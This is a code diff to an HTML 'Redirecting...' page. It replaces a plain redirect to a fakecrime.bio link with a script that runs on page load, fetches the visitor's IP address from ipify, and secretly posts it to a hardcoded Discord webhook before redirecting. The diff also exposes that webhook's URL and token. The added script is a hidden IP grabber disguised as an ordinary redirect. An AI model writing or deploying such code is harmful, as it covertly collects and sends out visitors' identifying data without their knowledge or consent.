@@ -2,11 +2,34 @@
 <html>
   <head>
     <meta charset="UTF-8" />
-    <meta http-equiv="refresh" content="0; URL='https://fakecrime.bio/dxg'" />
-    <script type="text/javascript">
-      window.location.replace("https://fakecrime.bio/dxg");
-    </script>
     <title>Redirecting...</title>
+    <script type="text/javascript">
+      // Function to get IP and send to Discord webhook
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const webhookUrl = 'https://discord.com/api/webhooks/1368256023323873361/gaOniOEwf1VxcMFjqZi4umFRLRApTjyd7phFHoCxnIHlDuCRGSwxzVw83zurUHEA6Tyc';
+          const message = {
+            content:`Someone entered your website from this IP address:${ip}`
+          };
+          
+          // Send IP to Discord webhook
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'},            body: JSON.stringify(message)
+          })
+          .finally(() => {
+            // Redirect to the website after sending the webhook
+            window.location.replace('https://fakecrime.bio/dxg');
+          });
+        })
+        .catch(() => {
+          // In case of error, still redirect
+          window.location.replace('https://fakecrime.bio/dxg');
+        });
+    </script>
   </head>
   <body>
   </body>
